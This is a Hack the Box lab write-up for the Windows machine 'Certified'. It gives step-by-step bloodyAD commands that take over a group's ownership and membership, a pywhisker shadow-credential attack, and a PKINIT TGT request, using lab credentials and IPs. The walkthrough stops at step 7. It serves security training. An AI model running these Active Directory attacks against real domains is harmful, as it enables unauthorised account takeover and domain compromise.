# Certified

**Platform: Hack the Box**

**OS: Windows**

**Diffculty: Medium**


## Key Learnings

- Familiarize myself with enumerating AD networks using Bloodhound
- Abuse GenericAll and ForceChangePassword privileges to change user passwords using *net rpc*
- Exploit GenericWrite privileges by running a targeted kerberoasting attack on vulnerable account
- Abuse DCSync privs to dump SAM and LSA hashes and compromise the Domain Controller by passing the hash
- Use Hashcat to crack .psafe3 file


## **Disclaimer: Potential spoilers below**


## Walkthrough

1. Run nmap scan
![image](https://github.com/user-attachments/assets/3d450477-a74d-497b-b96d-dacf1a0f743d)

2. judith.mader has WriteOwner permissions on management group which has GenericWrite privs on management_svc account
![image](https://github.com/user-attachments/assets/9f75d80d-89af-40a5-9972-eb0ff164c551)

3. change owner of management group to judith
	i. `python3 bloodyAD.py --host 10.129.231.186 -d certified.htb -u judith.mader -p judith09 set owner "Management" judith.mader`
4. then give GenericAll privs to judith
	i. `python3 bloodyAD.py --host 10.129.231.186 -d certified.htb -u judith.mader -p judith09 add genericAll Management judith.mader`
5. then add judith to the management group
	i. `python3 bloodyAD.py --host 10.129.231.186 -d certified.htb -u judith.mader -p judith09 add groupMember Management judith.mader`
![image](https://github.com/user-attachments/assets/83e0b353-2b33-456e-be7e-4c4f9fd180cf)

6. now can run shadow credential attack on management_svc
  	i. 'python3 pywhisker.py -d certified.htb -u judith.mader -p judith09 -t management_svc -a add --dc-ip 10.129.130.180'
![image](https://github.com/user-attachments/assets/445020c8-2150-461e-ba74-1bd4d5fdaf5b)

7. use PKINIT tools to get TGT for management_svc. Got a clock skew error so fix clock skew and then run again
	i. 'python3 gettgtpkinit.py -cert-pfx PFX_FILE -pfx-pass PFX_PASS certified.htb/management_svc -dc-ip 10.129.130.180 ccache'
![image](https://github.com/user-attachments/assets/0931b573-328f-4fd0-a0c3-2e4d937da20c)


 
